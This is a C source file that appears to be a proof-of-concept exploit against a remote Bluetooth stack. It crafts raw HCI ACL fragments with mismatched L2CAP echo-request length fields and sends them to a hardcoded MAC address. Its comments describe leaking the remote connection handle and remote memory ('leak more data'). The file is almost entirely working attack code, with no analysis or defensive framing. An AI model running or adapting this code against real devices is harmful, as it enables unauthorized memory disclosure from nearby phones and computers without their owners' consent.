#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#define ECHO_REQUEST 0x08
#define ECHO_RESPONSE 0x09

#define HANDLE_MASK 0x0FFF
#define START_PACKET_BOUNDARY 2
#define CONTINUATION_PACKET_BOUNDARY 1

#define l2_hci_packet_header_len 13
#define MSG_HC_TO_STACK_HCI_ACL 0x1100


typedef struct fakedata{
    uint16_t fake_handle;
    uint16_t fake_len_acl;
    uint16_t fake_len_l2cap;
    uint16_t fake_cid;
    //acl_hdr
    uint8_t fake_command;
    uint8_t fake_ident;
    uint16_t fake_len_data;
} __attribute__((packed))fakedata;


typedef struct l2_hci_packet
{
    unsigned char pk;
    uint16_t handle;
    uint16_t len_acl;
    // hci_hdr
    uint16_t len_l2cap;
    uint16_t cid;
    //acl_hdr
    uint8_t command;
    uint8_t ident;
    uint16_t len_data;
    //l2cap_hdr
    uint8_t data[];
} __attribute__((packed)) l2_hci_packet;

typedef struct l2_command_packet
{
    uint8_t command;
    uint8_t ident;
    uint16_t len;
    uint8_t data[];
} __attribute__((packed)) l2_command_packet;

l2_hci_packet *create_l2_echo_hci(uint16_t handle, uint8_t ident, int datalen, int continuation_flags, int lenadjust)
{
    l2_hci_packet *packet = calloc(1, lenadjust + datalen + l2_hci_packet_header_len);
    if (!packet)
    {
        exit(0);
        return NULL;
    }
    packet->pk = 2;
    packet->handle = (handle & HANDLE_MASK) | (continuation_flags << 12);
    packet->len_acl = datalen + 8;
    //hci
    packet->len_l2cap = datalen + 4 + lenadjust;
    packet->cid = htobs(0x0001);
    //acl
    packet->command = ECHO_REQUEST;
    packet->ident = ident;
    packet->len_data = datalen + lenadjust;
    //l2cap
    return packet;
}

void packet_free(l2_hci_packet *packet)
{
    packet = ((long)packet) & (~0xf);
    free(packet);
}

l2_command_packet *recv_l2_echo(int sock, int ident)
{
    char buf[0x1000] = {};
    int n = read(sock, buf, 0x1000);
    if (n < 0)
    {
        return NULL;
    }
    l2_command_packet *packet = calloc(1, n);
    if (!packet)
    {
        return NULL;
    }
    memcpy(packet, buf, n);
    printf("recv a l2_packet command is %d length is %d \n", packet->command, packet->len);

    if (packet->command != ECHO_RESPONSE )
    {
        puts("echo resp");
        return NULL;
    }
    puts("is a l2cap echo resp");
    printf("            ");
    for (size_t i = 0; i < packet->len; i++)
    {
        printf("%02x ", packet->data[i]);
        if ((i % 0x10) == (0xf-4))
        {
            puts("");
        }
    }
    puts("");

    return packet;
}

int send_l2_echo(l2_hci_packet *packet, int sock, int length)
{
    struct iovec iv;
    iv.iov_base = packet;
    iv.iov_len = length;
    if (writev(sock, &iv, 1) < 0)
    {
        puts("write error");
        exit(-1);
        return -1;
    }
    return 0;
}

int main(int argc, char **argv)
{
    setbuf(stdin,0);
    setbuf(stdout, 0);
    char mac_addr[] = "9c:2e:a1:53:bf:16";
    int hci_device_id = hci_get_route(NULL);
    int hci_socket = hci_open_dev(hci_device_id);
    int opt = 1;
    
    struct sockaddr_hci addr = {};
    addr.hci_family = AF_BLUETOOTH;
    addr.hci_dev = 0; // hci0
    printf("get hci socket %d\n", hci_socket);

    int l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
    if (bind(l2_sock, &addr, sizeof(addr)) < 0)
    {
        puts("bind error2");
        exit(0);
    }
    struct sockaddr_l2 daddr;
    daddr.l2_family = AF_BLUETOOTH;
    str2ba(mac_addr, &daddr.l2_bdaddr);
    if (connect(l2_sock, (struct sockaddr *)&daddr, sizeof(daddr)) < 0)
    {
        puts("connect error");
        exit(0);
    }
    //getchar();
    struct l2cap_conninfo l2_conninfo;
    socklen_t l2_conninfolen = sizeof(l2_conninfo);
    getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen);
    printf("get handle %d\n", l2_conninfo.hci_handle);
    int handle = l2_conninfo.hci_handle;
    //leak remote handle   data len > 0x40 to avoid change xx_hdr
    l2_hci_packet *packet = create_l2_echo_hci(handle, 0xaa, 0x36-9, 2, 2);
    memset(packet->data, 0x1, packet->len_data);
    send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
    packet_free(packet);
    
    packet = create_l2_echo_hci(handle, 0xab, 0x50, 1, 0);
    memset(packet->data, 0x1, packet->len_data);
    send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
    packet_free(packet);


    // leak more data
    // bt_hdr 8 event len offset layer
    // hci_hdr 4 handle len
    // acl_hdr 4 len cid
    // l2cap hdr  command ident len 
    // data    8+4+4 



    // for (size_t i = 0; i < 0x50; i++)
    // {
    //     packet->ident = 0x8e + i;
    //     for (size_t j = 0; j < packet->len_data; j++)
    //     {
    //         packet->data[j] = i;
    //     }
    //     send_l2_echo(packet,hci_socket,packet->len_data+l2_hci_packet_header_len);
    //     l2packet  = recv_l2_echo(l2_sock,packet->ident);
    //     while(!l2packet){
    //         l2packet = recv_l2_echo(l2_sock,packet->ident);
    //     }
    //     //sleep(1);
    // }
    getchar();

    close(l2_sock);
    close(hci_socket);



}